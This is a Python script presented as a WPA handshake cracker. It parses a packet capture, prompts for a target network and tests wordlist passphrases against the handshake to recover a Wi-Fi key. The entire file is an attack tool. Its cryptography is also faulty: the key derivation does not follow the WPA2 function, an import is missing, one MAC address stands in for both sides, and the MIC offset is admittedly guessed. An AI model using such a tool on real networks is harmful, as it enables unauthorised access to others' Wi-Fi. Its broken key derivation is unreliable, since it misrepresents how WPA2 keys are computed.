import argparse
import hashlib
import hmac
import struct
import binascii
from scapy.all import rdpcap, Dot11, EAPOL
from time import sleep

# PBKDF2-HMAC-SHA1 function
def pbkdf2_sha1(passphrase, essid, iterations=4096):
    # ESSID and passphrase are combined to form the input to PBKDF2
    key = passphrase.encode('utf-8')
    salt = essid.encode('utf-8')
    dk = hashlib.pbkdf2_hmac('sha1', key, salt, iterations, dklen=32)
    return dk

# Compute PMK from passphrase and ESSID
def compute_pmk(passphrase, essid):
    return pbkdf2_sha1(passphrase, essid)

# Compute PTK from PMK, MAC addresses, and a counter (as per WPA spec)
def compute_ptk(pmk, aa, ap, anonce, snonce):
    # WPA2 spec defines the PTK as derived from PMK, AA (AP MAC), AP (client MAC), nonces
    ptk_input = struct.pack('!6s6s', aa, ap) + anonce + snonce
    return hmac.new(pmk, ptk_input, hashlib.sha1).digest()

# Extract necessary handshake information from the capture
def extract_handshake(capture):
    handshake = []
    for packet in capture:
        if packet.haslayer(Dot11) and packet.haslayer(EAPOL):
            bssid = packet[Dot11].addr2
            essid = None
            if packet.haslayer(Dot11Elt):
                for element in packet[Dot11Elt]:
                    if element.ID == 0:  # ESSID element
                        essid = element.info.decode('utf-8')
            if essid:
                handshake.append({
                    'bssid': bssid,
                    'essid': essid,
                    'eapol': packet[EAPOL]
                })
    return handshake

# Function to handle the cracking process
def crack_handshake(capture_file, wordlist_file):
    capture = rdpcap(capture_file)
    handshakes = extract_handshake(capture)
    
    if not handshakes:
        print("No handshakes found.")
        return

    # If only one network, automatically select it
    if len(handshakes) == 1:
        selected_network = handshakes[0]
    else:
        # Multiple networks, prompt the user for selection
        print("Available networks:")
        for idx, handshake in enumerate(handshakes, 1):
            print(f"{idx}  {handshake['bssid']}  {handshake['essid']}")
        target_index = int(input("Index number of target network? ")) - 1
        selected_network = handshakes[target_index]

    essid = selected_network['essid']
    bssid = selected_network['bssid']
    eapol = selected_network['eapol']

    print(f"Attacking network: {essid} ({bssid})")

    with open(wordlist_file, 'r') as wordlist:
        for line in wordlist:
            passphrase = line.strip()

            # Compute PMK and PTK
            pmk = compute_pmk(passphrase, essid)
            ptk = compute_ptk(pmk, bssid.encode(), bssid.encode(), eapol[0:32], eapol[32:64])

            # Extract EAPOL HMAC from the handshake and compare
            eapol_hmac = eapol[64:]  # Assuming this is how the HMAC is structured
            if hmac.compare_digest(ptk[:16], eapol_hmac):
                print(f"\nKEY FOUND! [{passphrase}]")
                print(f"PMK: {binascii.hexlify(pmk).upper()}")
                print(f"PTK: {binascii.hexlify(ptk).upper()}")
                print(f"EAPOL HMAC: {binascii.hexlify(eapol_hmac).upper()}")
                break
            else:
                print(f"Trying: {passphrase}")
                print(f"PMK: {binascii.hexlify(pmk).upper()}")
                print(f"PTK: {binascii.hexlify(ptk).upper()}")
                print(f"EAPOL HMAC: {binascii.hexlify(eapol_hmac).upper()}")
                sleep(0.1)  # Throttle the output for better readability

# Argument parsing
def main():
    parser = argparse.ArgumentParser(description="Crack WPA Handshake")
    parser.add_argument("-P", "--wordlist", required=True, help="Path to wordlist file")
    parser.add_argument("-f", "--capture", required=True, help="Path to capture file (.cap/.pcap)")
    args = parser.parse_args()

    crack_handshake(args.capture, args.wordlist)

if __name__ == "__main__":
    main()
